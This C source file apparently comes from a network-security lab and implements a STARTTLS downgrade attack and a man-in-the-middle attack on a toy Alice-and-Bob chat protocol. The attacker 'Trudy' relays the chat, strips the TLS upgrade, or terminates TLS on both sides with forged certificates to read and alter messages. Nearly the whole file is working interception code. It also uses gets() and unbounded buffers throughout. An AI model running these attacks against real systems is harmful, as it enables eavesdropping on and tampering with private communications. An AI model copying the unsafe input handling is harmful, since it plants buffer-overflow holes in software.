#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <resolv.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <openssl/crypto.h>
#include <netdb.h>
SSL_CTX* serverCTX(void)
{
    OpenSSL_add_all_algorithms(); 
    SSL_CTX *sctx;
    SSL_METHOD *met; 
    SSL_load_error_strings();  
    met = TLS_server_method();  
    sctx = SSL_CTX_new(met);  
    int ca=SSL_CTX_load_verify_locations(sctx,"FakeCerts/root.crt", NULL); 
    int ke=SSL_CTX_use_PrivateKey_file(sctx, "FakeCerts/fakebob-key.pem", SSL_FILETYPE_PEM);
    int ce=SSL_CTX_use_certificate_file(sctx, "FakeCerts/fakebob.crt", SSL_FILETYPE_PEM);
    if(ca!=1)
    {
    	printf("\nCA certificate not loaded");
    	abort();
    }
    if(ke!=1)
    {
    	printf("\nPrivate key not loaded");
    	abort();
    }
    if(ce!=1)
    {
    	printf("\nServer certificate not loaded");
    	abort();
    }
    if(!SSL_CTX_check_private_key(sctx))
    {
    	printf("\nPrivate is wrong(not matching with uploaded certificate)");
    	abort();
    }			
    SSL_CTX_set_verify(sctx, SSL_VERIFY_PEER, NULL);
    SSL_CTX_set_verify_depth(sctx, 1);
 
    return sctx;
}

SSL_CTX* clientCTX(void)
{   
    OpenSSL_add_all_algorithms(); 
    SSL_CTX *cctx;
    SSL_METHOD *met; 
    SSL_load_error_strings();  
    met = TLS_client_method();  
    cctx = SSL_CTX_new(met); 
    int ca=SSL_CTX_load_verify_locations(cctx,"FakeCerts/root.crt", NULL); 
    int ke=SSL_CTX_use_PrivateKey_file(cctx, "FakeCerts/fakealice-key.pem", SSL_FILETYPE_PEM);
    int ce=SSL_CTX_use_certificate_file(cctx, "FakeCerts/fakealice.crt", SSL_FILETYPE_PEM);
    if(ca!=1)
    {
    	printf("\nCA certificate not loaded");
    	abort();
    }
    if(ke!=1)
    {
    	printf("\nPrivate key not loaded");
    	abort();
    }
    if(ce!=1)
    {
    	printf("\nServer certificate not loaded");
    	abort();
    }
    if(!SSL_CTX_check_private_key(cctx))
    {
    	printf("\nPrivate is wrong(not matching with uploaded certificate)");
    	abort();
    }		
    SSL_CTX_set_verify(cctx, SSL_VERIFY_PEER, NULL);
    SSL_CTX_set_verify_depth(cctx, 1);  
    return cctx;
}

void communication(SSL* ssl)
{
	char sen[100]={0};
	char rec[100]={0};
	if(SSL_accept(ssl)!=-1)
	{
	
		//display(ssl);
		if (SSL_get_verify_result(ssl)==X509_V_OK) 
		{
			printf("\n Certificate verification successful\n");
		}
		while((strcmp(rec,"done")!=0))
		{
			memset(rec,0,100);
			int re=SSL_read(ssl,rec,sizeof(rec));
			printf("\nAlice: %s",rec);
			if(strcmp(rec,"chat_close")==0)
			{
				break;
			}
			printf("\nBob:");
			gets(sen);
			char *m=sen;
			SSL_write(ssl,m,strlen(m));
			
			if(strcmp(sen,"chat_close")==0)
			{
				break;
			}
		}
	}
	else
	{
		printf("\nerror connecting");
		ERR_print_errors_fp(stderr);
	}
	int s=SSL_get_fd(ssl);
	SSL_free(ssl);
	close(s);
}


int main(int argc,char **argv)
{
	if(strcmp(argv[1],"-d")==0)
	{	
		//Downgrade attack
		struct hostent *host;
		const char *hostname=argv[3];
		host=gethostbyname(hostname);
		int cd;
		struct sockaddr_in addr;
		cd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); //trudy as a client to Bob
		if(cd<0)
		{
			printf("\nsocket not created");
			exit(0);
		}
		addr.sin_family=AF_INET;
		addr.sin_port=htons(12120);
		addr.sin_addr.s_addr=*(long*)(host->h_addr);
		int con=connect(cd, (struct sockaddr*)&addr, sizeof(addr));
		if (con!= 0)
    		{
        		close(cd);
        		printf("\nnot connected");
        		exit(0);
    		}

		//---------------------------------------------------------------------------------

		int sd;
		sd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); //trudy as server to alice
		if(sd<0)
		{
			printf("\nSocket not created");
			exit(0);
		}
		struct sockaddr_in adr;
		adr.sin_family=AF_INET;
		adr.sin_port=htons(12120);
		adr.sin_addr.s_addr=inet_addr("172.31.0.4");
		int bin=bind(sd,(struct sockaddr*)&adr, sizeof(adr));
		if(bin<0)
		{
			printf("\nnot binded");
			exit(0);
		}
		int lis=listen(sd,2);
		if(lis<0)
		{
			printf("\nnot done");
			exit(0);
		}
		socklen_t l=sizeof(adr);
		int cli = accept(sd, (struct sockaddr*)&adr, &l);
		
		char buf[100]={0};
		char str[50];
		strcpy(str,"chat_STARTTLS_NOT_SUPPORTED");
	
		while(strcmp(buf,"chat_close")!=0)
		{
			memset(buf,0,100);
			read(cli,buf,100);
			printf("\nAlice:%s",buf);
			if(strcmp(buf,"chat_close")==0)
			{
				close(cli);
				close(sd);
				exit(0);
			}
			if(strcmp(buf,"chat_STARTTLS")==0)
			{
				printf("\nBob:%s",str);
				if(send(cli,str,50,0)<=0)
				{
				  printf("message couldn't be sent");
				}
			}
			else
			{
				char mm[100];
				send(cd,buf,100,0);
				read(cd,mm,100);
				printf("Bob:%s",mm);
				send(cli,mm,100,0);
				if(strcmp(mm,"chat_close")==0)
				{
					close(cli);
					close(sd);
					exit(0);
				}
			}
		}
	}

	else if(strcmp(argv[1],"-m")==0)
	{
		//Man in the middle attack
		struct hostent *host;
		const char *hostname=argv[3];
		host=gethostbyname(hostname);
		char buf[100]={0};
		int cd;
		struct sockaddr_in addr;
		cd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); //trudy as a client to Bob
		if(cd<0)
		{
			printf("\nsocket not created");
			exit(0);
		}
		addr.sin_family=AF_INET;
		addr.sin_port=htons(12120);
		addr.sin_addr.s_addr=*(long*)(host->h_addr);
		int con=connect(cd, (struct sockaddr*)&addr, sizeof(addr));
		if (con!= 0)
    		{
        		close(cd);
        		printf("\nnot connected");
        		exit(0);
    		}

		//---------------------------------------------------------------------------------

		int sd;
		sd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); //trudy as server to alice
		if(sd<0)
		{
			printf("\nSocket not created");
			exit(0);
		}
		struct sockaddr_in adr;
		adr.sin_family=AF_INET;
		adr.sin_port=htons(12120);
		adr.sin_addr.s_addr=inet_addr("172.31.0.4");
		int bin=bind(sd,(struct sockaddr*)&adr, sizeof(adr));
		if(bin<0)
		{
			printf("\nnot binded");
			exit(0);
		}
		int lis=listen(sd,2);
		if(lis<0)
		{
			printf("\nnot done");
			exit(0);
		}
		socklen_t l=sizeof(adr);
		int cli = accept(sd, (struct sockaddr*)&adr, &l);
		
		char bufa[100]={0};
		char bufb[100]={0};
		while(strcmp(bufb,"chat_close")!=0)
		{
			l1:
			memset(bufa,0,100);
			memset(bufb,0,100);
			read(cli,bufa,100);
			printf("Alice to Trudy:%s",bufa);
			char m[100];
			printf("\nTrudy to Bob:");
			gets(m);
			char *msg3=m;
			if((strcmp(bufa,"chat_STARTTLS")==0) && (strcmp(m,"chat_STARTTLS")==0))
			{
				send(cd,msg3,strlen(msg3),0);
				printf("\nBob to Trudy:");
				read(cd,bufb,100);
				printf("%s",bufb);
				if(strcmp(bufb,"chat_close")==0)
				{
					exit(0);
				}
				char g1[100];
				printf("\nTrudy to Alice:");
				gets(g1);
				char *mg1=g1;
				if((strcmp(bufb,"chat_STARTTLS_ACK")==0) && (strcmp(g1,"chat_STARTTLS_ACK")==0))
				{
					send(cli,"chat_STARTTLS_ACK",100,0);
					printf("\nStarting TLS:");
					break;
				}
				else
				{
					send(cli,g1,100,0);
					if(strcmp(g1,"chat_close")==0)
					{
						exit(0);
					}
					goto l1;
				}
			}
			send(cd,msg3,strlen(msg3),0);
			if(strcmp(m,"chat_close")==0)
			{
				close(cli);
				close(sd);
				close(cd);
				exit(0);
			}
			read(cd,bufb,100);
			printf("\nBob to Trudy:%s",bufb);
			char g[100];
			printf("\nTrudy to Alice:");
			gets(g);
			char *mg=g;
			send(cli,mg,strlen(mg),0);
			if(strcmp(mg,"chat_close")==0)
			{
				close(cli);
				close(sd);
				close(cd);
				exit(0);
			}
		}
		printf("\n HERE");
		SSL_CTX *cctx;
		SSL_library_init();
		cctx=clientCTX();
		SSL *ssl2;
		ssl2=SSL_new(cctx);
		SSL_set_fd(ssl2,cd);
		int con1=SSL_connect(ssl2);
		if(SSL_get_verify_result(ssl2)==X509_V_OK)
		{
			printf("\nServer's certificate verification sucessfull");
		}

		SSL_CTX *sctx;
		SSL_library_init();
		sctx = serverCTX();
		SSL *ssl1;
		ssl1=SSL_new(sctx);
		SSL_set_fd(ssl1,cli);
		SSL_accept(ssl1);
		if(SSL_get_verify_result(ssl1)==X509_V_OK)
		{
			printf("\nClient's certificate verification sucessfull");
		}

		char bufsa[100]={0};
		char bufsb[100]={0};
		while(strcmp(bufsa,"chat_close")!=0 || strcmp(bufsb,"chat_close")!=0)
		{
			memset(bufsa,0,100);
			memset(bufsb,0,100);
			SSL_read(ssl1,bufsa,100);
			printf("\nAlice to Trudy:%s",bufsa);
			if(strcmp(bufsa,"chat_close")==0)
			{
				SSL_write(ssl2,"chat_close",0);
				exit(0);
			}
			char mm1[100];
			printf("\nTrudy to bob:");
			gets(mm1);
			char *msg1=mm1;
			SSL_write(ssl2,msg1,strlen(msg1));
			if(strcmp(mm1,"chat_close")==0)
			{
				SSL_free(ssl2);
    				SSL_CTX_free(cctx);
    				close(cd);
				SSL_CTX_free(sctx);
				close(sd);
				close(cli);
				exit(0);
			}
			SSL_read(ssl2,bufsb,100);
			printf("\nBob to trudy:%s",bufsb);
			if(strcmp(bufsb,"chat_close")==0)
			{
				SSL_write(ssl1,bufsb,100);
				SSL_free(ssl2);
    				SSL_CTX_free(cctx);
    				close(cd);
				SSL_CTX_free(sctx);
				close(sd);
				close(cli);
				exit(0);
			}
			char mm2[100];
			printf("\nTrudy to Alice:");
			gets(mm2);
			char *msg2=mm2;
			SSL_write(ssl1,msg2,strlen(msg2));
			if(strcmp(mm2,"chat_close")==0)
			{
				SSL_free(ssl2);
    				SSL_CTX_free(cctx);
    				close(cd);
				SSL_CTX_free(sctx);
				close(sd);
				close(cli);
				exit(0);
			}
		}
		SSL_free(ssl2);
    		SSL_CTX_free(cctx);
    		close(cd);
		SSL_CTX_free(sctx);
		close(sd);
		close(cli);
	}
	else
	{
		printf("\nInvalid Option");
	}
	
	
}
